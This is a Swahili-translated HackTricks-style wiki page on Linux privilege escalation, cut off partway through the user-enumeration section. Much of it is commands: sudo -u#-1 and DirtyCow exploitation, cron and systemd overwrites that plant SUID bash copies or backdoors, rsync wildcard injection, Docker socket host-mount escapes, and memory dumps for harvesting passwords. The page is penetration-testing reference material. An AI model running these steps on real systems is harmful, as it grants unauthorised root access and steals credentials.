# Linux Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## Taarifa za Mfumo

### Taarifa za OS

Tuanze kupata uelewa wa OS inayokimbia
```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```
### Path

Ikiwa una **idhini za kuandika kwenye saraka yoyote ndani ya `PATH`** variable unaweza kuwa na uwezo wa hijack baadhi ya libraries au binaries:
```bash
echo $PATH
```
### Taarifa za Env

Je, kuna taarifa zinazovutia, passwords au API keys katika environment variables?
```bash
(env || set) 2>/dev/null
```
### Kernel exploits

Angalia kernel version na kama kuna exploit fulani ambayo inaweza kutumika ku-escalate privileges
```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```
Unaweza kupata orodha nzuri ya kernel zilizo na udhaifu na baadhi ya **compiled exploits** tayari hapa: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) and [exploitdb sploits](https://gitlab.com/exploit-database/exploitdb-bin-sploits).\
Tovuti nyingine ambapo unaweza kupata baadhi ya **compiled exploits**: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

Ili kutoa matoleo yote ya kernel yenye udhaifu kutoka kwenye tovuti hiyo unaweza kufanya:
```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```
Vifaa vinavyoweza kusaidia kutafuta kernel exploits ni:

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (execute IN victim,only checks exploits for kernel 2.x)

Daima **search the kernel version in Google**, labda kernel version yako imeandikwa katika baadhi ya kernel exploit na basi utakuwa na uhakika kuwa exploit hiyo ni halali.

### CVE-2016-5195 (DirtyCow)

Linux Privilege Escalation - Linux Kernel <= 3.19.0-73.8
```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```
### Sudo toleo

Kulingana na matoleo ya sudo yaliyo dhaifu yanayoonekana katika:
```bash
searchsploit sudo
```
Unaweza kuangalia ikiwa toleo la sudo ni dhaifu kwa kutumia grep hii.
```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```
#### sudo < v1.28

Kutoka kwa @sickrov
```
sudo -u#-1 /bin/bash
```
### Dmesg signature verification failed

Angalia **smasher2 box of HTB** kwa **mfano** wa jinsi vuln hii ingeweza kutumiwa.
```bash
dmesg 2>/dev/null | grep "signature"
```
### Zaidi ya system enumeration
```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```
## Orodhesha ulinzi unaowezekana

### AppArmor
```bash
if [ `which aa-status 2>/dev/null` ]; then
aa-status
elif [ `which apparmor_status 2>/dev/null` ]; then
apparmor_status
elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
ls -d /etc/apparmor*
else
echo "Not found AppArmor"
fi
```
### Grsecurity
```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```
### PaX
```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```
### Execshield
```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```
### SElinux
```bash
(sestatus 2>/dev/null || echo "Not found sestatus")
```
### ASLR
```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```
## Docker Breakout

Ikiwa uko ndani ya docker container, unaweza kujaribu kutoroka kutoka kwake:


{{#ref}}
docker-security/
{{#endref}}

## Diski

Angalia **nini kime-mounted na kime-unmounted**, wapi na kwa nini. Ikiwa kitu chochote kime-unmounted, unaweza kujaribu ku-mount na kukagua taarifa za faragha.
```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```
## Programu muhimu

Orodhesha binaries muhimu
```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```
Vilevile, angalia kama **any compiler is installed**. Hii ni muhimu ikiwa utahitaji kutumia kernel exploit kwani inashauriwa ku-compile ndani ya mashine utakayoitumia (au kwenye ile inayofanana).
```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```
### Programu Zenye Udhaifu Zilizowekwa

Kagua toleo la **vifurushi na huduma zilizowekwa**. Huenda kuna toleo la zamani la Nagios (kwa mfano) ambalo linaweza kutumiwa kupandisha ruhusa…\
Inashauriwa kukagua kwa mkono toleo la programu zilizosakinishwa zinazoshukiwa zaidi.
```bash
dpkg -l #Debian
rpm -qa #Centos
```
Ikiwa una ufikiaji wa SSH kwenye mashine unaweza pia kutumia **openVAS** kukagua programu zilizopitwa na wakati na zilizo na udhaifu zilizosakinishwa ndani ya mashine.

> [!NOTE] > _Kumbuka kwamba amri hizi zitaonyesha taarifa nyingi ambazo kwa kawaida hazitakuwa na maana, kwa hivyo inashauriwa kutumia programu kama OpenVAS au nyingine zinazofanana ambazo zitakagua kama toleo lolote la programu lililosakinishwa lina udhaifu dhidi ya exploits zinazojulikana_

## Michakato

Angalia **michakato gani** inaendeshwa na hakiki kama kuna mchakato wowote unao **idhinishaji zaidi kuliko inavyostahili** (labda tomcat inatekelezwa na root?)
```bash
ps aux
ps -ef
top -n 1
```
Daima angalia uwezekano wa [**electron/cef/chromium debuggers** running, you could abuse it to escalate privileges](electron-cef-chromium-debugger-abuse.md). **Linpeas** detect those by checking the `--inspect` parameter inside the command line of the process.\
Pia **angalia ruhusa zako juu ya binaries za michakato**, labda unaweza kuandika juu ya binaari ya mtu mwingine.

### Ufuatiliaji wa michakato

Unaweza kutumia zana kama [**pspy**](https://github.com/DominicBreuker/pspy) kufuatilia michakato. Hii inaweza kuwa nzuri sana kubaini michakato iliyo hatarishi inayotekelezwa mara kwa mara au wakati seti ya mahitaji zinapotimizwa.

### Kumbukumbu ya mchakato

Baadhi ya huduma za server huhifadhi **credentials in clear text inside the memory**.\
Kwa kawaida utahitaji **root privileges** kusoma kumbukumbu ya michakato inayomilikiwa na watumiaji wengine, kwa hivyo hii kawaida ni muhimu zaidi unapokuwa tayari root na unataka kugundua credentials zaidi.\
Hata hivyo, kumbuka kwamba **kwa mtumiaji wa kawaida unaweza kusoma kumbukumbu za michakato unayomiliki**.

> [!WARNING]
> Tambua kwamba siku hizi mashine nyingi **haziruhusu ptrace kwa chaguo-msingi** ambayo ina maana huwezi kuchukua dump za michakato ya watumiaji wasiokuwa na ruhusa. 
>
> The file _**/proc/sys/kernel/yama/ptrace_scope**_ controls the accessibility of ptrace:
>
> - **kernel.yama.ptrace_scope = 0**: michakato yote inaweza kudebugiwa, mradi wana uid sawa. Hii ni njia ya jadi jinsi ptracing ilivyofanya kazi.
> - **kernel.yama.ptrace_scope = 1**: tu mchakato mzazi unaweza kudebugiwa.
> - **kernel.yama.ptrace_scope = 2**: Ni admin tu anaweza kutumia ptrace, kwa sababu inahitaji uwezo wa CAP_SYS_PTRACE.
> - **kernel.yama.ptrace_scope = 3**: Hakuna michakato inayoweza kufuatiliwa kwa ptrace. Mara imewekwa, inahitaji kuanzisha upya ili kuwezesha ptracing tena.

#### GDB

Ikiwa una ufikivu wa kumbukumbu ya huduma ya FTP (kwa mfano) unaweza kupata Heap na kutafuta ndani yake credentials.
```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```
#### GDB Skripti
```bash:dump-memory.sh
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
| sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
| while read start stop; do \
gdb --batch --pid $1 -ex \
"dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```
#### /proc/$pid/maps & /proc/$pid/mem

Kwa process ID fulani, maps zinaonyesha jinsi memory imepangwa ndani ya virtual address space ya mchakato huo; pia zinaonyesha permissions za kila mapped region. Faili bandia mem inafichua memory ya mchakato yenyewe. Kutoka kwenye faili ya maps tunajua ni maeneo gani ya memory yanayosomwa na offsets zao. Tunatumia taarifa hizi kufanya seek ndani ya faili ya mem na dump maeneo yote yanayosomwa kwenye faili.
```bash
procdump()
(
cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
while read a b; do
dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
done )
cat $1*.bin > $1.dump
rm $1*.bin
)
```
#### /dev/mem

`/dev/mem` hutoa ufikiaji kwa **kumbukumbu ya kimwili** ya mfumo, si kumbukumbu ya virtual. Eneo la anwani ya virtual la kernel linaweza kufikiwa kwa kutumia /dev/kmem.\
Kwa kawaida, `/dev/mem` inaweza kusomwa tu na **root** na kundi la **kmem**.
```
strings /dev/mem -n10 | grep -i PASS
```
### ProcDump kwa linux

ProcDump ni toleo la Linux la zana klasiki ya ProcDump kutoka katika suite ya zana za Sysinternals kwa Windows. Pata kwenye [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)
```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```
### Zana

Ili kufanya dump kumbukumbu ya mchakato unaweza kutumia:

- [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_Unaweza kuondoa mahitaji ya root kwa mkono na kufanya dump mchakato unaomilikiwa na wewe
- Script A.5 from [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) (root inahitajika)

### Credentials kutoka kwenye kumbukumbu za mchakato

#### Mfano wa mkono

Ikiwa utagundua kwamba mchakato wa authenticator unaendesha:
```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```
Unaweza dump mchakato (angalia sehemu zilizotangulia ili kupata njia tofauti za dump kumbukumbu ya mchakato) na kutafuta nyaraka za uthibitisho ndani ya kumbukumbu:
```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```
#### mimipenguin

Chombo [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) kitapora **nywila/taarifa za kuingia zilizo kwa maandishi wazi kutoka kwenye kumbukumbu** na kutoka kwa baadhi ya **faili zinazojulikana**. Kinahitaji ruhusa za root ili kifanye kazi ipasavyo.

| Kipengele                                         | Jina la mchakato     |
| ------------------------------------------------- | -------------------- |
| GDM password (Kali Desktop, Debian Desktop)       | gdm-password         |
| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop) | gnome-keyring-daemon |
| LightDM (Ubuntu Desktop)                          | lightdm              |
| VSFTPd (Active FTP Connections)                   | vsftpd               |
| Apache2 (Active HTTP Basic Auth Sessions)         | apache2              |
| OpenSSH (Active SSH Sessions - Sudo Usage)        | sshd:                |

#### Regexes za utafutaji/[truffleproc](https://github.com/controlplaneio/truffleproc)
```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```
## Scheduled/Cron jobs

Angalia ikiwa kazi yoyote iliyopangwa ni dhaifu. Labda unaweza kuchukua fursa ya script inayotekelezwa na root (wildcard vuln? unaweza kubadilisha faili ambazo root anazitumia? tumia symlinks? unda faili maalum katika directory ambayo root anaitumia?).
```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```
### Cron path

Kwa mfano, ndani ya _/etc/crontab_ unaweza kupata PATH: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_Kumbuka jinsi user "user" ana haki za kuandika juu ya /home/user_)

Ikiwa ndani ya crontab hii user root anajaribu kutekeleza amri au script bila kuweka PATH. Kwa mfano: _\* \* \* \* root overwrite.sh_\
Kisha, unaweza kupata root shell kwa kutumia:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```
### Cron using a script with a wildcard (Wildcard Injection)

Ikiwa script inayotekelezwa na root ina “**\***” ndani ya amri, unaweza kuitumia kusababisha matokeo yasiyotarajiwa (kama privesc). Mfano:
```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```
**Ikiwa wildcard imewekwa kabla ya njia kama** _**/some/path/\***_ **, haiko hatarini (hata** _**./\***_ **haiko).**

Soma ukurasa ufuatao kwa ujanja zaidi za wildcard exploitation:


{{#ref}}
wildcards-spare-tricks.md
{{#endref}}

### Kuandika tena Cron script na symlink

Ikiwa unaweza **kuhariri Cron script** inayotekelezwa na root, unaweza kupata shell kwa urahisi sana:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```
Ikiwa script inayotekelezwa na root inatumia **directory ambapo una ufikiaji kamili**, inaweza kuwa ya manufaa kufuta folder hiyo na **kuunda folder la symlink kuelekea nyingine** inayohudumia script unayodhibiti.
```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```
### Cron jobs za mara kwa mara

Unaweza kufuatilia processes ili kutafuta zile zinazotekelezwa kila dakika 1, 2 au 5. Labda unaweza kuchukua faida yake na escalate privileges.

Kwa mfano, ili **kufuatilia kila 0.1s kwa muda wa dakika 1**, **kupanga kwa amri zilizotekelezwa kidogo** na kufuta amri ambazo zimetekelezwa zaidi, unaweza kufanya:
```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```
**Unaweza pia kutumia** [**pspy**](https://github.com/DominicBreuker/pspy/releases) (hii itafuatilia na kuorodhesha kila process inayozinduliwa).

### Cron jobs zisizoonekana

Inawezekana kuunda cronjob **kwa kuweka carriage return baada ya comment** (bila newline character), na cron job itafanya kazi. Mfano (angalia carriage return char):
```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```
## Huduma

### Faili za _.service_ zinazoweza kuandikwa

Angalia ikiwa unaweza kuandika faili yoyote ya `.service`, ikiwa unaweza, unaweza **kuibadilisha** ili i**ite** backdoor yako wakati huduma **inapoanza**, **inapoanzishwa tena** au **inaposimamishwa** (labda utahitaji kusubiri mpaka mashine i**anzishwe upya**).\
Kwa mfano tengeneza backdoor yako ndani ya faili ya .service kwa **`ExecStart=/tmp/script.sh`**

### Service binaries zinazoweza kuandikwa

Kumbuka kwamba ikiwa una **idhini ya kuandika kwa binaries zinazotekelezwa na services**, unaweza kuzibadilisha kwa backdoors ili wakati services zitakaporudishwa tena, backdoors zitatekelezwa.

### systemd PATH - Relative Paths

Unaweza kuona PATH inayotumika na **systemd** kwa:
```bash
systemctl show-environment
```
Iwapo utagundua kuwa unaweza **kuandika** katika yoyote ya folda kwenye njia hiyo, huenda ukaweza **escalate privileges**. Unahitaji kutafuta **relative paths being used on service configurations** kwenye faili kama:
```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```
Kisha, tengeneza **faili inayotekelezwa** yenye **jina lile lile kama relative path binary** ndani ya systemd PATH folder unayoweza kuandika, na wakati service itaombwa kutekeleza kitendo kilicho dhaifu (**Start**, **Stop**, **Reload**), yako **backdoor itatekelezwa** (watumiaji wasiokuwa na ruhusa kwa kawaida hawawezi kuanzisha/kuacha services lakini angalia kama unaweza kutumia `sudo -l`).

**Jifunze zaidi kuhusu huduma kwa `man systemd.service`.**

## **Timers**

**Timers** ni systemd unit files ambazo jina lao linaisha kwa `**.timer**` na zinadhibiti faili au matukio ya `**.service**`. **Timers** zinaweza kutumika kama mbadala wa cron kwani zina msaada uliojengwa kwa matukio ya kalenda na matukio ya monotonic time na zinaweza kuendeshwa asynchronously.

Unaweza kuorodhesha timers zote kwa:
```bash
systemctl list-timers --all
```
### Taimera zinazoweza kuandikwa

Ikiwa unaweza kubadilisha taimera, unaweza kuifanya itekeleze baadhi ya units zilizopo za systemd.unit (kama `.service` au `.target`).
```bash
Unit=backdoor.service
```
Katika nyaraka unaweza kusoma ni nini Unit:

> Unit itakayozinduliwa wakati timer hii inapokwisha. Hoja ni jina la unit, ambalo suffix yake si ".timer". Ikiwa haijatafsiriwa, thamani hii hutumika kwa default kwa service yenye jina sawa na timer unit, isipokuwa kwa suffix. (Tazama hapo juu.) Inashauriwa kwamba jina la unit linalozinduliwa na jina la unit ya timer ziwe zinaitwa kwa namna ile ile, isipokuwa kwa suffix.

Kwa hivyo, ili kutumia vibaya ruhusa hii utahitaji:

- Pata systemd unit fulani (kama a `.service`) ambayo inatekeleza **binary inayoweza kuandikwa**
- Pata systemd unit fulani ambayo inatekeleza **relative path** na wewe una **ruhusa za kuandika** juu ya **systemd PATH** (ili kujifanya executable huyo)

**Jifunze zaidi kuhusu timers kwa kutumia `man systemd.timer`.**

### **Kuwezesha Timer**

Ili kuwezesha timer unahitaji ruhusa za root na kutekeleza:
```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```
Note the **timer** is **activated** by creating a symlink to it on `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer`

## Sockets

Unix Domain Sockets (UDS) zinaruhusu **mawasiliano ya michakato** kwenye mashine moja au tofauti ndani ya mifano ya client-server. Zinatumia faili za descriptor za Unix za kawaida kwa mawasiliano kati ya kompyuta na zinaanzishwa kupitia `.socket` files.

Sockets zinaweza kusanidiwa kwa kutumia `.socket` files.

**Jifunze zaidi kuhusu sockets kwa kutumia `man systemd.socket`.** Ndani ya faili hii, vigezo kadhaa vya kuvutia vinaweza kusanidiwa:

- `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: Chaguzi hizi ni tofauti lakini muhtasari unatumika **kuonyesha mahali itakaposikiliza** socket (njia ya faili ya AF_UNIX socket file, IPv4/6 na/au nambari ya port kusikiliza, n.k.)
- `Accept`: Takes a boolean argument. If **true**, a **service instance is spawned for each incoming connection** and only the connection socket is passed to it. If **false**, all listening sockets themselves are **passed to the started service unit**, and only one service unit is spawned for all connections. This value is ignored for datagram sockets and FIFOs where a single service unit unconditionally handles all incoming traffic. **Defaults to false**. For performance reasons, it is recommended to write new daemons only in a way that is suitable for `Accept=no`.
- `ExecStartPre`, `ExecStartPost`: Takes one or more command lines, which are **executed before** or **after** the listening **sockets**/FIFOs are **created** and bound, respectively. The first token of the command line must be an absolute filename, then followed by arguments for the process.
- `ExecStopPre`, `ExecStopPost`: Additional **commands** that are **executed before** or **after** the listening **sockets**/FIFOs are **closed** and removed, respectively.
- `Service`: Specifies the **service** unit name **to activate** on **incoming traffic**. This setting is only allowed for sockets with Accept=no. It defaults to the service that bears the same name as the socket (with the suffix replaced). In most cases, it should not be necessary to use this option.

### Writable .socket files

Ikiwa utapata faili `.socket` inayoweza kuandikwa unaweza **ongeza** mwanzoni mwa sehemu ya `[Socket]` kitu kama: `ExecStartPre=/home/kali/sys/backdoor` na the backdoor itatekelezwa kabla socket iundwe. Therefore, you will **probably need to wait until the machine is rebooted.**\
_Note that the system must be using that socket file configuration or the backdoor won't be executed_

### Writable sockets

Ikiwa **unatambua socket yoyote inayoweza kuandikwa** (_sasa tunazungumzia Unix Sockets na si kuhusu faili za konfigurasi `.socket`_), basi **unaweza kuwasiliana** na socket hiyo na labda kutumia udhaifu.

### Orodhesha Unix Sockets
```bash
netstat -a -p --unix
```
### Muunganisho mbichi
```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```
**Exploitation example:**


{{#ref}}
socket-command-injection.md
{{#endref}}

### HTTP sockets

Kumbuka kwamba huenda kuna baadhi ya **sockets listening for HTTP** requests (_sina kuzungumzia .socket files bali mafaili yanayotumika kama unix sockets_). Unaweza kuangalia hili kwa:
```bash
curl --max-time 2 --unix-socket /pat/to/socket/files http:/index
```
Ikiwa socket **inajibu ombi la HTTP**, basi unaweza **kuwasiliana** nayo na labda **exploit some vulnerability**.

### Docker Socket Inayoweza Kuandikwa

Docker socket, mara nyingi inayopatikana katika `/var/run/docker.sock`, ni faili muhimu ambayo inapaswa kulindwa. Kwa chaguo-msingi, inaweza kuandikwa na mtumiaji `root` na wanachama wa kundi la `docker`. Kuwa na write access kwa socket hii kunaweza kusababisha privilege escalation. Hapa kuna muhtasari wa jinsi hii inaweza kufanywa na mbinu mbadala ikiwa Docker CLI haitapatikana.

#### **Privilege Escalation with Docker CLI**

Ikiwa una write access kwenye Docker socket, unaweza escalate privileges kwa kutumia amri zifuatazo:
```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```
These commands allow you to run a container with root-level access to the host's file system.

#### **Kutumia Docker API Moja kwa Moja**

Katika matukio ambapo Docker CLI haipatikani, socket ya Docker bado inaweza kudhibitiwa kwa kutumia Docker API na amri za `curl`.

1.  **Orodhesha Docker Images:** Pata orodha ya images zilizo hapa.

```bash
curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
```

2.  **Create a Container:** Tuma ombi la kuunda container ambayo inamounsha directory ya root ya host.

```bash
curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"<ImageID>","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}' http://localhost/containers/create
```

Anzisha container iliyoundwa hivi karibuni:

```bash
curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<NewContainerID>/start
```

3.  **Attach to the Container:** Tumia `socat` kuanzisha muunganisho kwenye container, ukiruhusu utekelezaji wa amri ndani yake.

```bash
socat - UNIX-CONNECT:/var/run/docker.sock
POST /containers/<NewContainerID>/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
Host:
Connection: Upgrade
Upgrade: tcp
```

Baada ya kusanidi muunganisho wa `socat`, unaweza kutekeleza amri moja kwa moja ndani ya container ukiwa na upatikanaji wa root kwa filesystem ya host.

### Wengine

Kumbuka kwamba ikiwa una vibali vya kuandika kwenye docker socket kwa sababu uko **inside the group `docker`** una [**more ways to escalate privileges**](interesting-groups-linux-pe/index.html#docker-group). Ikiwa [**docker API is listening in a port** you can also be able to compromise it](../../network-services-pentesting/2375-pentesting-docker.md#compromising).

Angalia **more ways to break out from docker or abuse it to escalate privileges** katika:


{{#ref}}
docker-security/
{{#endref}}

## Containerd (ctr) privilege escalation

Ikiwa unagundua kwamba unaweza kutumia amri ya **`ctr`** soma ukurasa unaofuata kwani **huenda ukaweza kuiba matumizi yake ili kuongeza privileji**:


{{#ref}}
containerd-ctr-privilege-escalation.md
{{#endref}}

## **RunC** privilege escalation

Ikiwa unagundua kwamba unaweza kutumia amri ya **`runc`** soma ukurasa unaofuata kwani **huenda ukaweza kuiba matumizi yake ili kuongeza privileji**:


{{#ref}}
runc-privilege-escalation.md
{{#endref}}

## **D-Bus**

D-Bus ni mfumo tata wa **inter-Process Communication (IPC)** ambao unawawezesha programu kuingiliana kwa ufanisi na kushirikiana data. Umeundwa kwa mfumo wa kisasa wa Linux, na hutoa mfumo thabiti kwa aina mbalimbali za mawasiliano ya programu.

Mfumo ni wenye ufanisi, ukisaidia IPC ya msingi inayoongeza kubadilishana data kati ya michakato, ikikumbusha **enhanced UNIX domain sockets**. Zaidi ya hayo, husaidia kutangaza matukio au ishara, ikileta ushirikiano miongoni mwa vipengele vya mfumo. Kwa mfano, ishara kutoka kwa daemon ya Bluetooth kuhusu simu inayokuja inaweza kusababisha player wa muziki kutuliza sauti, kuboresha uzoefu wa mtumiaji. Pia, D-Bus ina mfumo wa remote objects, kurahisisha ombi la huduma na kuita method kati ya programu, ikirahisisha michakato ambayo kwa kawaida ilikuwa ngumu.

D-Bus inafanya kazi kwa mfano wa **allow/deny**, ikisimamia ruhusa za ujumbe (miito ya method, utoaji wa signal, n.k.) kulingana na athari ya jumla ya kanuni za sera zinazolingana. Sera hizi zinaeleza mwingiliano na bus, na zinaweza kuruhusu kuongeza privileji kupitia unyonyaji wa ruhusa hizi.

Mfano wa sera kama hiyo katika `/etc/dbus-1/system.d/wpa_supplicant.conf` umetolewa, ukielezea ruhusa kwa mtumiaji root kumiliki, kutuma, na kupokea ujumbe kutoka kwa `fi.w1.wpa_supplicant1`.

Sera zisizo na mtumiaji au kundi maalum zinatumika kwa wote, wakati sera za muktadha "default" zinatumika kwa wote wasiothibitishwa kwa sera maalum nyingine.
```xml
<policy user="root">
<allow own="fi.w1.wpa_supplicant1"/>
<allow send_destination="fi.w1.wpa_supplicant1"/>
<allow send_interface="fi.w1.wpa_supplicant1"/>
<allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```
**Jifunze jinsi ya kuorodhesha na kutumia mawasiliano ya D-Bus hapa:**


{{#ref}}
d-bus-enumeration-and-command-injection-privilege-escalation.md
{{#endref}}

## **Mtandao**

Inavutia kila wakati kuorodhesha mtandao na kugundua nafasi ya mashine.

### Orodhesho la jumla
```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#Files used by network services
lsof -i
```
### Bandari zilizofunguliwa

Daima angalia huduma za mtandao zinazokimbia kwenye mashine ambazo haukuweza kuingiliana nazo kabla ya kupata ufikiaji wake:
```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
```
### Sniffing

Angalia ikiwa unaweza sniff traffic. Ikiwa unaweza, unaweza kupata baadhi ya credentials.
```
timeout 1 tcpdump
```
## Watumiaji

### Uorodheshaji wa Jumla

Angalia **nani** wewe ni, **ni ruhusa gani** ulizonazo, **ni watumiaji gani** wako kwenye mifumo, ni yapi wanaoweza **kuingia** na ni yapi wana **idhinisho za root:**
```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
